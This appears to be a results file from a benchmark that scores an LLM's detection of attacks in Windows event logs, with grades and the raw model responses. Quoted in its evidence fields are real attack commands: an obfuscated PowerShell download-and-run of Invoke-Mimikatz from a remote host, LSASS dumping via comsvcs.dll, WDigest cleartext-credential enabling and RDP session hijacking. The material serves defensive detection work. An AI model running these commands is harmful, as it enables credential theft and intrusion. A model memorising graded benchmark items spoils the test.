# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID33205-SQL Server failed login with disabled SA account.evtx,easy,A,processed,YES,100.0,75.0,YES,33205,,sa,,10.23.23.9,,0.0,3.34,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: sa
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
Multiple failed login attempts for the privileged 'sa' SQL Server account originate from the same client IP (10.23.23.9) within seconds of each other, indicating a brute-force or password-guessing attack against the database. The repeated authentication failures (state 7) targeting the highest-privilege SQL account are a strong signal of credential-attack behavior rather than benign activity."
claude-opus-4-8,ID4625-failed login with denied access due to account restriction.evtx,easy,A,processed,YES,100.0,100.0,YES,4625,C:\Windows\System32\winlogon.exe,"FS03$, -",,10.23.23.9,,0.0,4.48,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4625
- Processes: C:\Windows\System32\winlogon.exe
- Accounts: FS03$, -
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
Multiple failed logon events (4625) with LogonType 10 (RemoteInteractive/RDP) originate from the same source IP 10.23.23.9 within a short timeframe, all with Status 0xC000006E (invalid account/bad credentials). This repeated failed RDP authentication pattern targeting FS03 is consistent with an RDP brute-force or credential-guessing attack rather than a single benign mistyped login."
claude-opus-4-8,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,100.0,YES,1,"powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))",,,0.0,4.56,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: powershell.exe, WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))
- Network: None
- Registry: None

EXPLANATION:
PowerShell was spawned by WmiPrvSE.exe, indicating remote WMI-based execution, a common lateral movement and remote-execution technique. The command line uses obfuscation (backtick in Get-C`ommand, string-format reconstruction of ""iex"", and piping an environment variable) to evade detection while invoking Invoke-Expression at High integrity. These traits strongly indicate malicious activity rather than routine administration."
claude-opus-4-8,ID1-WMIexec process execution.evtx,easy,A,processed,YES,100.0,100.0,YES,1,C:\Windows\System32\cmd.exe,NT AUTHORITY\SYSTEM,"C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat","127.0.0.1, \\127.0.0.1\C$\__output",,33.3,6.45,6.0,6.0,2.7,4,18.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
- Network: 127.0.0.1, \\127.0.0.1\C$\__output
- Registry: None

EXPLANATION:
This activity matches the behavioral pattern of remote command execution tools (e.g., Impacket smbexec/wmiexec), where commands are written to a batch file in TEMP, executed, output redirected to an admin share (\\127.0.0.1\C$\__output), and the batch file deleted to cover tracks. Execution runs as NT AUTHORITY\SYSTEM with System integrity, and the RuleName references accessibility-feature persistence (T1015). The redirect-execute-delete loop via cmd.exe is a strong indicator of malicious lateral movement / remote code execution rather than benign administration."
claude-opus-4-8,ID3-7-10-Suspicious DLL loaded (CME+Mimikatz).evtx,easy,A,processed,YES,100.0,100.0,YES,"7, 3, 10","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,,"10.23.42.38, 10.23.123.11",,0.0,4.90,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7, 3, 10
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig
- Commands: None
- Network: 10.23.42.38, 10.23.123.11
- Registry: None

EXPLANATION:
PowerShell (PID 2668) loaded System.Management.Automation and WMI modules, then opened a handle to lsass.exe with GrantedAccess 0x143A and an UNKNOWN call-trace frame, which is the classic signature of in-memory credential dumping (T1003). The same PowerShell process repeatedly initiated TCP/443 connections to 10.23.123.11, consistent with C2 beaconing/exfiltration following the LSASS access. The combination of LSASS memory access from an unsigned-module PowerShell process and outbound network activity strongly indicates malicious credential-theft behavior."
claude-opus-4-8,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,4.40,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, test-sql, dbo
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event records a successful (succeeded:true) ALTER SERVER ROLE statement adding the principal [test-sql] to the highly privileged [sysadmin] server role, granting full administrative control over the SQL Server instance. Adding a non-standard account like ""test-sql"" to sysadmin is a classic privilege-escalation/persistence technique, making this activity suspicious and consistent with attacker behavior."
claude-opus-4-8,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*",HACK-ME-PC.offsec.lan,,0.0,4.60,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
The same user (lambda-user) registered an MSSQLSvc SPN on an account and then enumerated all SPNs in the domain with ""setspn -T offsec -Q */*"", a classic Kerberoasting reconnaissance pattern. Adding an MSSQL service SPN to a user account and immediately querying every SPN indicates an attacker preparing to request and crack Kerberos service tickets for offline password cracking."
claude-opus-4-8,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,4.86,5.3,5.0,4.0,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: None
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The same actor (admmig) performs multiple rapid Kerberos network logons followed by SAMR pipe access (\\*\IPC$ samr), then resets the password (4724) and modifies the account (4738) of ""hacker2"" within milliseconds. This sequence of remote SAMR enumeration plus password reset and account change on another user is consistent with privilege manipulation / account takeover activity rather than routine administration."
claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,3.97,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a single Event ID 4673 (sensitive privilege use) where the account hack1 invoked SeMachineAccountPrivilege through lsass.exe against the Security Account Manager. This privilege governs adding workstations to a domain and is exercised through the legitimate system process, which is routine behavior; in isolation there is no privilege-escalation chain, suspicious command, or paired state change to indicate an attack."
claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,80.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,5.18,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The audit log was cleared (Event ID 1102) immediately before a suspicious chain in which admmig uses explicit credentials (4648) to log on as test10 (4624, LogonType 3) via powershell.exe, followed by reconnaissance commands (cmd /c whoami, whoami). The log-clearing combined with credential switching and discovery activity by the same actor is a strong indicator of attacker activity rather than routine administration."
claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,6.25,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The execution of MSFRottenPotato.exe by user hack1, immediately followed by an ANONYMOUS LOGON NTLM authentication from localhost (127.0.0.1) and a SYSTEM-level (S-1-5-18, FS03VULN$) cmd.exe spawned from the RottenPotato process, is a classic token-impersonation privilege escalation chain. The preceding Event 1102 (audit log cleared) further indicates anti-forensic activity. Together these events strongly indicate a malicious local privilege escalation to SYSTEM."
claude-opus-4-8,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,75.0,YES,"4624, 4674, 4688","cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(...Invoke-Mimikatz...privilege::debug sekurlsa::logonpasswords exit...) | C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""","10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/","\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",50.0,10.09,4.5,6.0,2.0,4,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 4674, 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd
- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(...Invoke-Mimikatz...privilege::debug sekurlsa::logonpasswords exit...); C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
- Network: 10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/
- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB

EXPLANATION:
The logs show a remote NTLM logon (including an NTLM V1 ANONYMOUS LOGON) from 10.23.123.11, followed by an obfuscated PowerShell command launched via cmd.exe that downloads Invoke-Mimikatz.ps1 from a remote host and runs credential-dumping (sekurlsa::logonpasswords). The SC Manager handle access via services.exe combined with remote service-style execution and a follow-on SYSTEM-level shell (C:\tools\shell.cmd) indicates lateral movement and credential theft consistent with a PsExec/SMB attack chain."
claude-opus-4-8,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"cmd.exe, powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN(...).sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')""",10.23.123.11:443,,16.7,9.26,4.5,6.0,3.3,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: cmd.exe, powershell.exe, WmiPrvSE.exe, wmiprvse.exe
- Accounts: OFFSEC\admmig
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN(...).sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')""
- Network: 10.23.123.11:443
- Registry: None

EXPLANATION:
A WmiPrvSE.exe parent spawning cmd.exe and an obfuscated PowerShell process is a classic remote WMI execution and command-and-control pattern. The PowerShell uses execution-bypass flags (-exec bypass -noni -nop -w 1), heavy character-array obfuscation, and Net.WebRequest/IEX downloads from 10.23.123.11:443 to fetch Invoke-Mimikatz.ps1 for credential dumping. The high integrity level, debug/sekurlsa logonpasswords arguments, and obfuscation confirm malicious credential-theft activity rather than routine administration."
claude-opus-4-8,ID400-800-CrackMapExec payload execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"600, 400, 800, 403",powershell.exe,OFFSEC\admmig,powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X') | Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit' | IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'),https://10.23.123.11:443/Invoke-Mimikatz.ps1,"None
- Process: powershell.exe",16.7,8.86,6.0,6.0,3.3,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 600, 400, 800, 403
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'; IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1
- Registry: None
- Process: powershell.exe

EXPLANATION:
This is a heavily obfuscated PowerShell one-liner using execution bypass, non-interactive/no-profile flags, and a char-code-decoded payload that downloads and executes Invoke-Mimikatz from a remote host (10.23.123.11) to dump credentials via sekurlsa::logonpasswords. The decoded content also disables TLS certificate validation, and the antivirus explicitly blocked it as ""malicious content,"" confirming credential-theft attack behavior by account OFFSEC\admmig."
claude-opus-4-8,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,90.0,YES,"1, 12, 13","C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",OFFSEC\admmig,reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1,,"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,5.36,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 12, 13
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe
- Accounts: OFFSEC\admmig
- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
- Network: None
- Registry: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential

EXPLANATION:
The reg.exe process spawned from cmd.exe sets the WDigest UseLogonCredential value to 1, which forces Windows to store cleartext credentials in memory. This is a well-known credential-harvesting technique (T1112/T1003) enabling subsequent plaintext password extraction via tools like Mimikatz. The high-integrity registry modification by an admin account paired with the CreateKey/SetValue events confirms deliberate credential-access tampering rather than benign activity."
claude-opus-4-8,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,95.8,YES,"18, 1, 7, 11, 10","C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,7.98,5.8,6.0,4.0,3,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 18, 1, 7, 11, 10
- Processes: C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
- Network: None
- Registry: None

EXPLANATION:
This is a classic LSASS credential-dumping attack: PowerShell spawned by WmiPrvSE.exe (remote WMI execution) invokes rundll32.exe with comsvcs.dll MiniDump to dump lsass.exe memory to \Windows\Temp\76nivOxA.dmp. The Event 10 shows rundll32 opening lsass with full access (0x1FFFFF) and a CallTrace through dbghelp.dll, confirming process memory dumping (T1003.001). The remote WMI parent, high-integrity context, and temp-directory dump file are strong indicators of malicious credential theft."
claude-opus-4-8,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,80.0,YES,"1, 10","C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""",,,0.0,5.20,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 10
- Processes: C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
- Commands: mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""
- Network: None
- Registry: None

EXPLANATION:
Mimikatz, a well-known credential-dumping tool, was executed at high integrity and then opened a handle to lsass.exe (GrantedAccess 0x1010) with a CallTrace originating from mimikatz.exe, indicating credential theft (T1003). It also spawned a cmd.exe child running as NT AUTHORITY\SYSTEM, demonstrating privilege escalation. This combination of LSASS access and SYSTEM-level shell from Mimikatz is clearly malicious."
claude-opus-4-8,ID4688-Audit policy enumerated.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4674","C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe",admmig,"""C:\Windows\system32\auditpol.exe""  /get /category:*",,,0.0,4.27,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4674
- Processes: C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe
- Accounts: admmig
- Commands: ""C:\Windows\system32\auditpol.exe""  /get /category:*
- Network: None
- Registry: None

EXPLANATION:
The audit log was cleared (Event 1102) immediately followed by the admmig account enumerating the full audit policy configuration via auditpol.exe /get /category:* (Event 4688), with privilege use of SeSecurityPrivilege (Event 4674). This sequence of clearing logs then reconnoitering the audit configuration is consistent with anti-forensic and defense-evasion activity rather than routine administration."
claude-opus-4-8,ID4688-Firewall configuration enumerated (command).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688",C:\Windows\System32\netsh.exe,admmig,"netsh  advfirewall show allprofiles, netsh  a show allprofiles",,,0.0,3.78,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\netsh.exe
- Accounts: admmig
- Commands: netsh  advfirewall show allprofiles, netsh  a show allprofiles
- Network: None
- Registry: None

EXPLANATION:
The Security audit log was cleared (Event ID 1102) immediately before firewall reconnaissance commands were executed, a classic anti-forensic and discovery pattern. The admmig account then ran netsh to enumerate firewall profiles, indicating defense evasion and environment reconnaissance rather than routine administration."
claude-opus-4-8,ID4688-Scheduled task configuration enumeration.evtx,easy,A,processed,YES,100.0,90.0,YES,"1102, 4688, 5145",C:\Windows\System32\schtasks.exe,admmig,schtasks  /query /xml,10.23.23.9,,0.0,4.17,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 5145
- Processes: C:\Windows\System32\schtasks.exe
- Accounts: admmig
- Commands: schtasks  /query /xml
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The audit log was cleared (Event 1102) immediately before reconnaissance via schtasks /query and administrative C$ share access from 10.23.23.9, a classic anti-forensic and lateral-movement pattern. The combination of log clearing, scheduled task enumeration, and remote admin share access by the same actor (admmig) within seconds strongly indicates malicious activity rather than routine administration."
claude-opus-4-8,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,69.6,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8",10.23.23.9,,0.0,5.70,4.2,5.0,4.0,3,16.2,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4779, 4778
- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe
- Accounts: FS01$, admmig, admmarsid
- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The SYSTEM account (S-1-5-18, FS01$) launches ""tscon 2 /dest:rdp-tcp#8"" to hijack an existing RDP session, a known privilege-escalation/session-hijacking technique (RDP session hijack via tscon). The disconnect of admmig (4779) immediately followed by reconnection of admmarsid (4778) on the same session RDP-Tcp#8 from JUMP01/10.23.23.9 confirms the actor took over another user's session without credentials, leveraging SYSTEM privileges."
claude-opus-4-8,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,81.5,YES,"4688, 4778","sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe","admmig, admmarsid, FS01$","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",10.23.23.9,,0.0,7.17,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4778
- Processes: sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe
- Accounts: admmig, admmarsid, FS01$
- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
A service named ""hijackservice"" is started by admmig via sc.exe, and a SYSTEM-launched (services.exe parent) cmd.exe runs ""tscon 2 /dest:rdp-tcp#5"" to hijack an existing RDP session (Event 4778 reconnects admmarsid from JUMP01/10.23.23.9), indicating RDP session hijacking and privilege abuse. The subsequent launch of eventvwr.msc via mmc.exe is a known UAC bypass / log-viewing technique consistent with privilege escalation. The combination of a suspicious service name, SYSTEM-spawned tscon session takeover, and the eventvwr execution chain strongly indicates malicious lateral movement and escalation."
